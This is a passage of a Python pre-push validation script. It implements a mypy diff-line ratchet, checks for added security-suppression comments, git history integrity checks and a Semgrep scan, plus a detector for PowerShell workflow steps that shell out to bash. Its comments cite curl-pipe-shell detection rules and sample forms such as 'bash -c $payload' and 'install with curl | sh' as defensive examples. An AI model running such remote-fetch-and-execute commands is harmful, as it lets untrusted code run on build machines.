            print("WARNING: episode extraction returned no valid id", file=sys.stderr)
            continue
        stage_result = _stage_episode(episode_id, repo_root)
        if stage_result != 0:
            return stage_result
    return 0


def _episode_id_from_output(stdout: str) -> str | None:
    try:
        payload = json.loads(stdout)
    except json.JSONDecodeError:
        return None
    episode_id = payload.get("id") if isinstance(payload, dict) else None
    if not isinstance(episode_id, str) or not EPISODE_ID_RE.fullmatch(episode_id):
        return None
    return episode_id


def _stage_episode(episode_id: str, repo_root: Path) -> int:
    relative_path = f".agents/memory/episodes/{episode_id}.json"
    episode_path = _safe_output_path(repo_root, relative_path)
    if episode_path is None:
        print(f"ERROR: unsafe generated episode path: {relative_path}", file=sys.stderr)
        return 2
    if not episode_path.is_file():
        print(f"WARNING: generated episode not found: {relative_path}", file=sys.stderr)
        return 0
    result = _run_git(repo_root, ["add", "--", relative_path])
    return result.returncode


# --- mypy diff-line ratchet (issue #2993) --------------------------------
# The pre-push mypy gate used to block on ANY error mypy reported in a touched
# file, including pre-existing debt the current push never changed. That
# coupled unrelated shared-file edits to old type errors and blocked pushes.
# The ratchet below blocks only on errors whose line was added or modified
# versus the merge base, so a push is judged on the lines it actually changed.
#
# A stored per-file signature baseline was rejected: mypy's reported error set
# is invocation-dependent (the same file yields different errors checked alone
# versus batched with siblings, because module resolution changes). Diff
# locality is invocation-independent, so it survives the batch/isolation split
# that _mypy_invocations() creates.
MYPY_RATCHET_BASE_REF_ENV = "MYPY_RATCHET_BASE_REF"
MYPY_RATCHET_DEFAULT_BASE = "origin/main"
# mypy default output: "path:line: error: message  [code]"; the column is
# absent in this repo's config but tolerated. Only ``error`` severity blocks;
# ``note`` lines are advisory and ignored.
MYPY_ERROR_RE = re.compile(r"^(?P<path>.+?):(?P<line>\d+):(?:\d+:)?\s*error:")
# Unified diff (``--unified=0``) markers. ``+++ b/<path>`` names the file with
# stable prefixes; the optional prefix keeps parser tests honest against
# diff.noprefix drift. The ``+c,d`` field of each hunk header is the changed-line
# span (post-image).
DIFF_ADDED_FILE_RE = re.compile(r"^\+\+\+ (?:b/)?(?P<path>.+)$")
DIFF_HUNK_RE = re.compile(r"^@@ -\d+(?:,\d+)? \+(?P<start>\d+)(?:,(?P<count>\d+))? @@")


def _normalize_ratchet_path(path: str) -> str:
    # mypy on Windows can echo OS-native backslash separators, while git diff
    # names and command-line inputs are forward-slash; normalize so the pushed
    # set, the changed-line map, and parsed mypy paths compare equal.
    cleaned = path.strip().replace("\\", "/")
    if cleaned.startswith("./"):
        cleaned = cleaned[2:]
    return cleaned


def _mypy_ratchet_base_ref() -> str:
    raw = os.environ.get(MYPY_RATCHET_BASE_REF_ENV, "").strip()
    if raw and not _is_zero_sha(raw):
        return raw
    return MYPY_RATCHET_DEFAULT_BASE


def _parse_changed_lines(diff_text: str) -> dict[str, set[int]]:
    # Post-image line numbers touched per file: both added and modified lines
    # land in the ``+start,count`` span. Two hunk shapes intentionally
    # contribute nothing, so the ratchet never blocks mypy errors on them:
    #   * Deletion-only hunks (``+N,0``) touch no post-image line. Adding
    #     ``start`` here would flag errors on an unchanged neighboring line,
    #     reintroducing the false positives on untouched code that the
    #     per-file gate produced before this ratchet (issue #2993).
    #   * Pure renames carry no ``+++ b/`` hunk, so the renamed path stays
    #     absent from the map; unchanged content cannot add new type debt.
    changed: dict[str, set[int]] = {}
    current: str | None = None
    for line in diff_text.splitlines():
        file_match = DIFF_ADDED_FILE_RE.match(line)
        if file_match is not None:
            current = _normalize_ratchet_path(file_match.group("path"))
            changed.setdefault(current, set())
            continue
        hunk_match = DIFF_HUNK_RE.match(line)
        if hunk_match is None or current is None:
            continue
        start = int(hunk_match.group("start"))
        count_raw = hunk_match.group("count")
        count = int(count_raw) if count_raw is not None else 1
        changed[current].update(range(start, start + count))
    return changed


def _changed_line_map(
    paths: Sequence[str],
    repo_root: Path,
    base_ref: str,
) -> dict[str, set[int]] | None:
    """Return added or modified line numbers per path versus ``base_ref``.

    ``None`` signals that the diff base could not be resolved; callers then
    fall back to blocking on any error so the gate is never weaker than before.
    """
    if not paths:
        return {}
    result = _run_git(
        repo_root,
        ["diff", "--unified=0", "--no-color", f"{base_ref}...HEAD", "--", *paths],
    )
    if result.returncode != 0:
        return None
    return _parse_changed_lines(result.stdout)


def _parse_mypy_error_locations(stdout: str) -> list[tuple[str, int]]:
    locations: list[tuple[str, int]] = []
    for line in stdout.splitlines():
        match = MYPY_ERROR_RE.match(line)
        if match is None:
            continue
        locations.append(
            (_normalize_ratchet_path(match.group("path")), int(match.group("line"))),
        )
    return locations


def _mypy_result_blocks(
    result: subprocess.CompletedProcess[str],
    pushed: set[str],
    changed_lines: dict[str, set[int]] | None,
) -> bool:
    if result.returncode == 0:
        return False
    locations = _parse_mypy_error_locations(result.stdout)
    if not locations:
        # Non-zero exit with no parseable error line is a fatal invocation
        # failure (crash, bad package name, hyphenated dir); block it.
        return True
    if changed_lines is None:
        # Diff base unresolved: block on any error (pre-ratchet behavior).
        return True
    return any(
        path in pushed and line in changed_lines.get(path, frozenset()) for path, line in locations
    )


def run_mypy(paths: Sequence[str], repo_root: Path) -> int:
    checked_paths: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe mypy path: {raw_path}", file=sys.stderr)
            return 2
        full_path = repo_root / path
        if not full_path.is_file():
            continue
        if full_path.is_symlink():
            print(f"ERROR: refusing to type-check symlink: {path}", file=sys.stderr)
            return 2
        checked_paths.append(path)
    if not checked_paths:
        return 0
    pushed = {_normalize_ratchet_path(path) for path in checked_paths}
    changed_lines = _changed_line_map(checked_paths, repo_root, _mypy_ratchet_base_ref())
    failed = False
    for invocation, needs_validation_path in _mypy_invocations(checked_paths):
        result = _invoke_mypy(invocation, repo_root, needs_validation_path)
        _print_process_output(result)
        if _mypy_result_blocks(result, pushed, changed_lines):
            failed = True
    return 1 if failed else 0


def _mypy_invocations(paths: Sequence[str]) -> list[tuple[list[str], bool]]:
    validation_paths: list[str] = []
    by_basename: dict[str, list[str]] = {}
    for path in paths:
        if path.startswith("scripts/validation/"):
            validation_paths.append(path)
            continue
        by_basename.setdefault(Path(path).name, []).append(path)
    unique: list[str] = []
    colliding: list[str] = []
    for basename_group in by_basename.values():
        if len(basename_group) == 1:
            unique.extend(basename_group)
        else:
            colliding.extend(basename_group)
    invocations: list[tuple[list[str], bool]] = []
    if unique:
        invocations.append((unique, False))
    invocations.extend(([path], False) for path in colliding)
    invocations.extend(([path], True) for path in validation_paths)
    return invocations


def _invoke_mypy(
    paths: Sequence[str],
    repo_root: Path,
    needs_validation_path: bool,
) -> subprocess.CompletedProcess[str]:
    extra_env = None
    if needs_validation_path:
        validation_path = str(repo_root / "scripts/validation")
        inherited = os.environ.get("MYPYPATH")
        value = f"{validation_path}{os.pathsep}{inherited}" if inherited else validation_path
        extra_env = {"MYPYPATH": value}
    return _run_command(
        [sys.executable, "-m", "mypy", "--", *paths],
        repo_root,
        extra_env=extra_env,
        timeout_seconds=MYPY_TIMEOUT_SECONDS,
    )


def _check_no_grafts(repo_root: Path) -> int:
    graft_path_result = _run_git(
        repo_root,
        ["rev-parse", "--git-path", "info/grafts"],
    )
    if graft_path_result.returncode != 0:
        print("ERROR: could not resolve the Git grafts path", file=sys.stderr)
        return 2
    graft_path_lines = graft_path_result.stdout.splitlines()
    if len(graft_path_lines) != 1 or not graft_path_lines[0]:
        print("ERROR: Git returned an invalid grafts path", file=sys.stderr)
        return 2
    grafts_path = Path(graft_path_lines[0])
    if not grafts_path.is_absolute():
        grafts_path = (repo_root / grafts_path).resolve()
    try:
        grafts = grafts_path.read_bytes()
    except FileNotFoundError:
        return 0
    except OSError as error:
        print(f"ERROR: could not read {grafts_path}: {error}", file=sys.stderr)
        return 2
    if not _has_graft_entries(grafts):
        return 0
    print(
        f"ERROR: active Git grafts are not allowed during push validation: {grafts_path}",
        file=sys.stderr,
    )
    return 2


def _check_history_integrity(repo_root: Path) -> int:
    shallow_result = _run_git(repo_root, ["rev-parse", "--is-shallow-repository"])
    if shallow_result.returncode != 0:
        print("ERROR: could not determine whether the repository is shallow", file=sys.stderr)
        return 2
    shallow_state = shallow_result.stdout.strip()
    if shallow_state not in {"false", "true"}:
        print(f"ERROR: unexpected shallow repository state: {shallow_state}", file=sys.stderr)
        return 2
    if shallow_state == "true":
        print(
            "ERROR: push validation requires complete Git history; fetch the full history",
            file=sys.stderr,
        )
        return 2
    return _check_no_grafts(repo_root)


def _has_graft_entries(grafts: bytes) -> bool:
    return any(
        line and not line.startswith(b"#")
        for raw_line in grafts.splitlines()
        if (line := raw_line.strip())
    )


def _push_updates(stream: TextIO, repo_root: Path) -> list[PushUpdate] | None:
    if _check_history_integrity(repo_root) != 0:
        return None
    try:
        push_refs = parse_push_refs(stream)
    except ValueError as error:
        print(f"ERROR: malformed pre-push input, {error}", file=sys.stderr)
        return None
    updates: list[PushUpdate] = []
    seen_heads: set[str] = set()
    for push_ref in push_refs:
        if push_ref.is_deletion or push_ref.local_sha in seen_heads:
            continue
        try:
            updates.append(resolve_push_update(push_ref, repo_root))
        except PushUpdateConfigError as error:
            print(f"ERROR: {error}", file=sys.stderr)
            return None
        seen_heads.add(push_ref.local_sha)
    return updates


def check_pushed_suppressions(stream: TextIO, repo_root: Path) -> int:
    updates = _push_updates(stream, repo_root)
    if updates is None:
        return 2
    violations: list[str] = []
    for update in updates:
        paths = _changed_commit_paths(update, repo_root)
        if paths is None:
            return 2
        added_violations = _added_suppression_violations(update, paths, repo_root)
        if added_violations is None:
            return 2
        violations.extend(added_violations)
    if not violations:
        return 0
    print("ERROR: security suppression comments detected in pushed commits:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def _added_suppression_violations(
    update: PushUpdate,
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    scan_paths = [
        path for path in paths if Path(path).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
    ]
    if not scan_paths:
        return []
    renames = _suppression_renames(repo_root, update.range_spec)
    if renames is None:
        return None
    promoted_paths = [path for path in scan_paths if path in renames.promoted_destinations]
    scan_paths = [
        path
        for path in scan_paths
        if path not in renames.pure_scanned_destinations
        and path not in renames.promoted_destinations
    ]
    if not scan_paths and not promoted_paths:
        return []
    notebook_paths, diff_scan_paths = _partition_suppression_paths(scan_paths)
    violations = _textual_suppression_violations(
        repo_root,
        range_spec=update.range_spec,
        paths=diff_scan_paths,
        head_label=update.head,
    )
    if violations is None:
        return None
    notebook_violations = _notebook_suppression_violations(update, notebook_paths, repo_root)
    if notebook_violations is None:
        return None
    violations.extend(notebook_violations)
    promoted_violations = _commit_full_content_suppression_violations(
        update,
        promoted_paths,
        repo_root,
    )
    if promoted_violations is None:
        return None
    violations.extend(promoted_violations)
    return violations


def _suppression_violations_in_diff(
    head: str,
    diff_text: str,
    allowed_paths: frozenset[str] | None = None,
) -> list[str]:
    changes = [
        change
        for change in _iter_diff_changes(diff_text)
        if allowed_paths is None or change[0] in allowed_paths
    ]
    removed: dict[str, Counter[str]] = {}
    for path, operation, _line_number, text in changes:
        if operation != "-":
            continue
        match = SECURITY_SUPPRESSION_RE.search(text)
        if match is None:
            continue
        removed.setdefault(path, Counter())[match.group(0)] += 1

    violations: list[str] = []
    for path, operation, line_number, text in changes:
        if operation != "+":
            continue
        match = SECURITY_SUPPRESSION_RE.search(text)
        if match is None:
            continue
        file_removed = removed.get(path)
        if file_removed and file_removed[match.group(0)] > 0:
            file_removed[match.group(0)] -= 1
            continue
        violations.append(f"{head[:12]}:{path}:{line_number}")
    return violations


def _iter_diff_changes(diff_text: str) -> Iterator[tuple[str, str, int, str]]:
    current_path = None
    current_line: int | None = None
    for line in diff_text.splitlines():
        if line.startswith("diff --git "):
            current_path = None
            current_line = None
            continue
        if current_line is None:
            file_match = DIFF_ADDED_FILE_RE.match(line)
            if file_match is not None and file_match.group("path") != "/dev/null":
                current_path = _normalize_ratchet_path(file_match.group("path"))
                continue
        hunk_match = DIFF_HUNK_RE.match(line)
        if hunk_match is not None:
            current_line = int(hunk_match.group("start"))
            continue
        if current_path is None or current_line is None or line.startswith("\\"):
            continue
        if line.startswith("-"):
            yield current_path, "-", current_line, line[1:]
            continue
        if line.startswith("+"):
            yield current_path, "+", current_line, line[1:]
            current_line += 1
            continue
        current_line += 1


def _partition_suppression_paths(paths: Sequence[str]) -> tuple[list[str], list[str]]:
    notebook_paths = [path for path in paths if Path(path).suffix.lower() == ".ipynb"]
    textual_paths = [path for path in paths if Path(path).suffix.lower() != ".ipynb"]
    return notebook_paths, textual_paths


def _textual_suppression_violations(
    repo_root: Path,
    *,
    range_spec: str,
    paths: Sequence[str],
    head_label: str,
    cached: bool = False,
) -> list[str] | None:
    if not paths:
        return []
    args = [
        "-c",
        "diff.noprefix=false",
        "-c",
        "core.quotePath=false",
        "diff",
    ]
    if cached:
        args.append("--cached")
    args.extend(
        (
            *TEXTUAL_DIFF_FLAGS,
            "--src-prefix=a/",
            "--dst-prefix=b/",
            "--find-renames",
            "--unified=0",
            "--no-color",
            range_spec,
            "--",
        )
    )
    result = _run_git(repo_root, args)
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return _suppression_violations_in_diff(
        head_label,
        result.stdout,
        frozenset(paths),
    )


def check_staged_suppressions(repo_root: Path) -> int:
    """Check staged changes (git diff --cached) for net-new security suppressions."""
    base_ref = _staged_suppression_base(repo_root)
    scan_paths = _staged_suppression_paths(repo_root, base_ref)
    if scan_paths is None:
        return 2
    violations = _staged_suppression_violations(scan_paths, repo_root, base_ref)
    if violations is None:
        return 2
    if not violations:
        return 0
    print("ERROR: security suppression comments detected in staged changes:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def _staged_suppression_violations(
    scan_paths: Sequence[str],
    repo_root: Path,
    base_ref: str,
) -> list[str] | None:
    if not scan_paths:
        return []
    renames = _suppression_renames(
        repo_root,
        base_ref,
        cached=True,
        context="staged changes",
    )
    if renames is None:
        return None
    promoted_paths = [path for path in scan_paths if path in renames.promoted_destinations]
    scan_paths = [
        path
        for path in scan_paths
        if path not in renames.pure_scanned_destinations
        and path not in renames.promoted_destinations
    ]
    if not scan_paths and not promoted_paths:
        return []
    notebook_paths, diff_scan_paths = _partition_suppression_paths(scan_paths)
    violations = _textual_suppression_violations(
        repo_root,
        range_spec=base_ref,
        paths=diff_scan_paths,
        head_label="staged",
        cached=True,
    )
    if violations is None:
        return None
    notebook_violations = _staged_notebook_suppression_violations(
        notebook_paths,
        repo_root,
        base_ref,
    )
    if notebook_violations is None:
        return None
    violations.extend(notebook_violations)
    promoted_violations = _staged_full_content_suppression_violations(
        promoted_paths,
        repo_root,
    )
    if promoted_violations is None:
        return None
    violations.extend(promoted_violations)
    return violations


def _staged_suppression_base(repo_root: Path) -> str:
    merge_heads = _approved_merge_head_commits(repo_root)
    return merge_heads[0] if len(merge_heads) == 1 else "HEAD"


def _staged_suppression_paths(repo_root: Path, base_ref: str) -> list[str] | None:
    result = _run_git(
        repo_root,
        [
            "diff",
            "--cached",
            "--name-only",
            "-z",
            "--diff-filter=ACMRT",
            base_ref,
        ],
    )
    if result.returncode != 0:
        _print_process_output(result)
        return None
    paths: list[str] = []
    for raw_path in result.stdout.split("\0"):
        if not raw_path:
            continue
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe staged suppression path: {raw_path}", file=sys.stderr)
            return None
        if Path(path).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES:
            paths.append(path)
    return paths


def _staged_notebook_suppression_violations(
    paths: Sequence[str],
    repo_root: Path,
    base_ref: str,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        head_text = _index_text_or_none(path, repo_root)
        if head_text is None:
            return None
        base_text = _commit_text_or_empty(base_ref, path, repo_root)
        violations.extend(
            _notebook_suppression_violations_for_text(
                "staged",
                path,
                base_text,
                head_text,
            )
        )
    return violations


def _staged_full_content_suppression_violations(
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        text = _index_text_or_none(path, repo_root)
        if text is None:
            return None
        violations.extend(_full_content_suppression_violations("staged", path, text))
    return violations


def _diff_notebook_suppression_violations(
    base_ref: str,
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        head_text = _commit_text_or_none("HEAD", path, repo_root)
        if head_text is None:
            return None
        base_text = _commit_text_for_base(base_ref, path, repo_root)
        if base_text is None:
            return None
        violations.extend(
            _notebook_suppression_violations_for_text("HEAD", path, base_text, head_text)
        )
    return violations


def _diff_full_content_suppression_violations(
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        text = _commit_text_or_none("HEAD", path, repo_root)
        if text is None:
            return None
        violations.extend(_full_content_suppression_violations("HEAD", path, text))
    return violations


def _added_suppression_violations_for_range(
    range_spec: str,
    base_ref: str,
    scan_paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    """Suppression-violation finder for a git range without a PushUpdate."""
    if not scan_paths:
        return []
    renames = _suppression_renames(repo_root, range_spec)
    if renames is None:
        return None
    promoted_paths = [path for path in scan_paths if path in renames.promoted_destinations]
    scan_paths = [
        path
        for path in scan_paths
        if path not in renames.pure_scanned_destinations
        and path not in renames.promoted_destinations
    ]
    if not scan_paths and not promoted_paths:
        return []
    notebook_paths, diff_scan_paths = _partition_suppression_paths(scan_paths)
    violations = _textual_suppression_violations(
        repo_root,
        range_spec=range_spec,
        paths=diff_scan_paths,
        head_label="HEAD",
    )
    if violations is None:
        return None
    notebook_violations = _diff_notebook_suppression_violations(base_ref, notebook_paths, repo_root)
    if notebook_violations is None:
        return None
    violations.extend(notebook_violations)
    promoted_violations = _diff_full_content_suppression_violations(promoted_paths, repo_root)
    if promoted_violations is None:
        return None
    violations.extend(promoted_violations)
    return violations


def check_suppression_diff(base_ref: str, repo_root: Path) -> int:
    """CI mirror of security-suppressions-push: compares HEAD against base_ref.

    Returns:
        0  no new security suppressions detected
        1  new security suppressions found
        3  git error (external failure)
    """
    range_spec = f"{base_ref}..HEAD"
    result = _run_git(
        repo_root,
        [
            "diff",
            *TEXTUAL_DIFF_FLAGS,
            "--name-only",
            "--diff-filter=ACMRT",
            "--no-renames",
            "-z",
            range_spec,
        ],
    )
    if result.returncode != 0:
        _print_process_output(result)
        return 3
    scan_paths: list[str] = []
    for raw_path in result.stdout.split("\0"):
        if not raw_path:
            continue
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe path in diff range: {raw_path}", file=sys.stderr)
            return 3
        if Path(path).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES:
            scan_paths.append(path)
    violations = _added_suppression_violations_for_range(
        range_spec, base_ref, scan_paths, repo_root
    )
    if violations is None:
        return 3
    if not violations:
        return 0
    print("ERROR: security suppression comments detected in diff range:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def _notebook_suppression_violations(
    update: PushUpdate,
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        head_text = _commit_text_or_none(update.head, path, repo_root)
        if head_text is None:
            return None
        base_text = _commit_text_or_empty(update.base, path, repo_root)
        violations.extend(
            _notebook_suppression_violations_for_text(
                update.head[:12],
                path,
                base_text,
                head_text,
            )
        )
    return violations


def _commit_full_content_suppression_violations(
    update: PushUpdate,
    paths: Sequence[str],
    repo_root: Path,
) -> list[str] | None:
    violations: list[str] = []
    for path in paths:
        text = _commit_text_or_none(update.head, path, repo_root)
        if text is None:
            return None
        violations.extend(_full_content_suppression_violations(update.head[:12], path, text))
    return violations


def _full_content_suppression_violations(
    head_label: str,
    path: str,
    text: str,
) -> list[str]:
    lines = (
        _notebook_code_lines(text) if Path(path).suffix.lower() == ".ipynb" else text.splitlines()
    )
    return [
        f"{head_label}:{path}:{line_number}"
        for line_number, line in enumerate(lines, start=1)
        if SECURITY_SUPPRESSION_RE.search(line)
    ]


def _notebook_suppression_violations_for_text(
    head_label: str,
    path: str,
    base_text: str,
    head_text: str,
) -> list[str]:
    base_lines = _notebook_code_lines(base_text)
    head_lines = _notebook_code_lines(head_text)
    return [
        f"{head_label}:{path}:{line_number}"
        for line_number in _added_line_numbers(base_lines, head_lines)
        if SECURITY_SUPPRESSION_RE.search(head_lines[line_number - 1])
    ]


def _index_text_or_none(path: str, repo_root: Path) -> str | None:
    result = _run_git(repo_root, ["show", f":{path}"])
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return result.stdout


def _commit_text_or_none(head: str, path: str, repo_root: Path) -> str | None:
    result = _run_git(repo_root, ["show", f"{head}:{path}"])
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return result.stdout


def _commit_text_or_empty(head: str, path: str, repo_root: Path) -> str:
    result = _run_git(repo_root, ["show", f"{head}:{path}"])
    return result.stdout if result.returncode == 0 else ""


def _commit_text_for_base(base_ref: str, path: str, repo_root: Path) -> str | None:
    """Return the text of a file at ``base_ref``, or ``""`` when the file is
    absent at that ref (new file), or ``None`` when ``base_ref`` itself is
    invalid so the caller can propagate rc=3 rather than rc=1."""
    result = _run_git(repo_root, ["show", f"{base_ref}:{path}"])
    if result.returncode == 0:
        return result.stdout
    # Distinguish "file not in tree" (new file, treat as empty) from any
    # other git failure (bad ref, corrupt repo, etc.) which is an external
    # error that should surface as rc=3, not produce spurious violations.
    if "does not exist in" in result.stderr or "exists on disk, but not in" in result.stderr:
        return ""
    _print_process_output(result)
    return None


def _notebook_code_lines(text: str) -> list[str]:
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        return text.splitlines()
    if not isinstance(parsed, dict):
        return text.splitlines()
    cells = parsed.get("cells")
    if not isinstance(cells, list):
        return text.splitlines()
    lines: list[str] = []
    for cell in cells:
        if not isinstance(cell, dict) or cell.get("cell_type") != "code":
            continue
        source = cell.get("source", [])
        if isinstance(source, str):
            lines.extend(source.splitlines())
        elif isinstance(source, list):
            lines.extend("".join(item for item in source if isinstance(item, str)).splitlines())
    return lines


def _added_line_numbers(base_lines: Sequence[str], head_lines: Sequence[str]) -> list[int]:
    numbers: list[int] = []
    matcher = difflib.SequenceMatcher(a=base_lines, b=head_lines, autojunk=False)
    for tag, _base_start, _base_end, head_start, head_end in matcher.get_opcodes():
        if tag in {"insert", "replace"}:
            numbers.extend(range(head_start + 1, head_end + 1))
    return numbers


def _changed_commit_paths(
    update: PushUpdate,
    repo_root: Path,
) -> list[str] | None:
    result = _run_git(
        repo_root,
        [
            "diff",
            *TEXTUAL_DIFF_FLAGS,
            "--name-only",
            "--diff-filter=ACMRT",
            "--no-renames",
            "-z",
            update.range_spec,
        ],
    )
    if result.returncode != 0:
        _print_process_output(result)
        return None
    paths: list[str] = []
    for raw_path in result.stdout.split("\0"):
        if not raw_path:
            continue
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe path in pushed range: {raw_path}", file=sys.stderr)
            return None
        paths.append(path)
    return paths


def _commit_paths(head: str, repo_root: Path) -> list[str] | None:
    result = _run_git(repo_root, ["ls-tree", "-r", "-z", "--name-only", head])
    if result.returncode != 0:
        _print_process_output(result)
        return None
    paths: list[str] = []
    for raw_path in result.stdout.split("\0"):
        if not raw_path:
            continue
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe path in pushed tree: {raw_path}", file=sys.stderr)
            return None
        paths.append(path)
    return paths


def _read_commit_blob(head: str, path: str, repo_root: Path) -> str | None:
    result = _run_git(repo_root, ["show", f"{head}:{path}"])
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return result.stdout


def _suppression_violations_in_text(head: str, path: str, text: str) -> list[str]:
    return [
        f"{head[:12]}:{path}:{line_number}"
        for line_number, line in enumerate(text.splitlines(), start=1)
        if SECURITY_SUPPRESSION_RE.search(line)
    ]


def scan_pushed_heads(stream: TextIO, repo_root: Path) -> int:
    updates = _push_updates(stream, repo_root)
    if updates is None:
        return 2
    for update in updates:
        paths = _changed_commit_paths(update, repo_root)
        if paths is None:
            return 2
        tree_paths = _commit_paths(update.head, repo_root)
        if tree_paths is None or _validate_materialization_paths(tree_paths) is None:
            return 2
        scan_paths = [
            path for path in paths if PurePosixPath(path).suffix.lower() in SEMGREP_SUFFIXES
        ]
        if not scan_paths:
            continue
        result = _scan_pushed_head(update.head, scan_paths, repo_root)
        if result != 0:
            return result
    return 0


def _scan_pushed_head(
    head: str,
    paths: Sequence[str],
    repo_root: Path,
) -> int:
    with tempfile.TemporaryDirectory(prefix="lefthook-semgrep-") as temp_dir:
        tree = Path(temp_dir)
        materialized = _materialize_commit_tree(head, tree, repo_root, paths)
        if materialized != 0:
            return materialized
        result = _run_semgrep_tree(tree, paths, repo_root)
        _print_process_output(result)
        if result.returncode != 0:
            return result.returncode
        return _scan_powershell_shell_outs(tree, paths)


def _scan_powershell_shell_outs(tree: Path, paths: Sequence[str]) -> int:
    """Refuse a PowerShell step that hands work to a POSIX shell.

    Semgrep's ``curl-eval`` and ``gha-curl-pipe-shell`` rules sub-parse a
    ``run:`` body as Bash. A ``shell: pwsh`` step invoking ``bash -c $payload``
    produces zero findings and zero errors, so no gate decision can see it while
    the payload still runs under Bash on the runner. That is a ruleset coverage
    gap rather than a gate bypass, so it is closed here instead. Refs #3684.
    """
    findings: list[tuple[str, str]] = []
    for path in paths:
        if PurePosixPath(path).suffix.lower() not in {".yml", ".yaml"}:
            continue
        try:
            text = (tree / path).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError, ValueError):
            continue
        for shell, body, _node in _yaml_run_scripts(text):
            if not _is_powershell_shell(shell):
                continue
            findings.extend((path, name) for name in _posix_shell_invocations(body))
    if not findings:
        return 0
    print("Semgrep cannot read a POSIX shell command written inside a PowerShell step.")
    for path, name in findings:
        print(f"  {path}: invokes {name}")
    print(
        "  Run the POSIX commands from a step with 'shell: bash' so the ruleset "
        "reads them, or move them into their own bash step."
    )
    return 1


def _is_powershell_shell(shell: str | None) -> bool:
    if not shell:
        return False
    try:
        tokens = shlex.split(shell, posix=False)
    except ValueError:
        tokens = shell.split()
    if not tokens:
        return False
    name = tokens[0].strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
    return name.removesuffix(".exe") in POWERSHELL_SHELLS


def _posix_shell_invocations(body: str) -> list[str]:
    """Return every POSIX shell a PowerShell body runs as a command.

    Parameters bind three ways: ``-FilePath bash``, ``-FilePath: bash``, and
    ``-FilePath:bash``. The first two leave the operand as its own word, so
    the ``previous`` check covers them once the trailing colon is stripped;
    the joined form carries the operand inside the word and is split here.
    """
    invocations: list[str] = []
    previous = ""
    for word, at_command in _powershell_words(body):
        parameter, separator, operand = word.strip("'\"").partition(":")
        if (
            separator
            and operand
            and parameter.lower() in POWERSHELL_EXEC_PARAMETERS
            and _is_posix_shell_name(operand)
        ):
            invocations.append(operand.strip("'\""))
            previous = word
            continue
        executes = (
            at_command or previous.strip("'\"").rstrip(":").lower() in POWERSHELL_EXEC_PARAMETERS
        )
        if executes and _is_posix_shell_name(word):
            invocations.append(word)
        previous = word
    return invocations


def _is_posix_shell_name(word: str) -> bool:
    name = word.strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
    return name.removesuffix(".exe") in POSIX_SHELLS


def _powershell_words(body: str) -> list[tuple[str, bool]]:
    """Split a PowerShell body into words, marking those in command position.

    Quoting decides whether text is code or data. A quoted string in command
    position stays, because PowerShell's call operator runs it; a quoted string
    anywhere else keeps its ``at_command`` flag clear, so the caller can decide
    from the preceding token whether it is an argument, a message, or the
    operand of a parameter that executes it. Without that split, a real
    workflow comment reading "the bash echo" and a real message reading
    "install with curl | sh" both read as invocations.
    """
    text = POWERSHELL_BLOCK_COMMENT_RE.sub(" ", body)
    words: list[tuple[str, bool]] = []
    current: list[str] = []
    index = 0
    length = len(text)
    expecting = True
    word_expecting = True

    def flush() -> None:
        nonlocal current, expecting, word_expecting
        if not current:
            return
        words.append(("".join(current), word_expecting))
        current = []
        expecting = False

    def start_word() -> None:
        nonlocal word_expecting
        if not current:
            word_expecting = expecting

    while index < length:
        character = text[index]
        if character == "`" and index + 1 < length:
            # Backtick is PowerShell's escape character, so ``ba`sh`` is ``bash``.
            start_word()
            current.append(text[index + 1])
            index += 2
            continue
        if character in "'\"":
            start_word()
            end = text.find(character, index + 1)
            end = length if end == -1 else end + 1
            current.append(text[index + 1 : end - 1])
            index = end
            continue
        if character == "#":
            end = text.find("\n", index)
            index = length if end == -1 else end
            continue
        if character in POWERSHELL_COMMAND_RESET:
            flush()
            expecting = True
            index += 1
            continue
        if character.isspace():
            flush()
            index += 1
            continue
        if character == "." and not current and expecting:
            # A leading dot is the dot-source operator, so the command follows it.
            index += 1
            continue
        start_word()
        current.append(character)
        index += 1
    flush()
    return words


def _materialize_commit_tree(
    head: str,
    destination: Path,
    repo_root: Path,
    paths: Sequence[str],
) -> int:
    validated_paths = _validate_materialization_paths(paths)
    if validated_paths is None:
        return 2
    for path in validated_paths:
        blob_id = _commit_blob_id(head, path, repo_root)
        if blob_id is None:
            return 2
        blob = _run_git_bytes(repo_root, ["cat-file", "blob", blob_id])
        if blob.returncode != 0:
            print(blob.stderr.decode("utf-8", errors="replace"), file=sys.stderr)
            return 2
        output = destination / path
        try:
            output.parent.mkdir(parents=True, exist_ok=True)
            with output.open("xb") as output_stream:
                output_stream.write(blob.stdout)
        except OSError as error:
            print(f"ERROR: cannot materialize pushed blob {path}: {error}", file=sys.stderr)
            return 2
    return 0


def _validate_materialization_paths(paths: Sequence[str]) -> list[str] | None:
    validated_paths: list[str] = []
    file_destinations: set[str] = set()
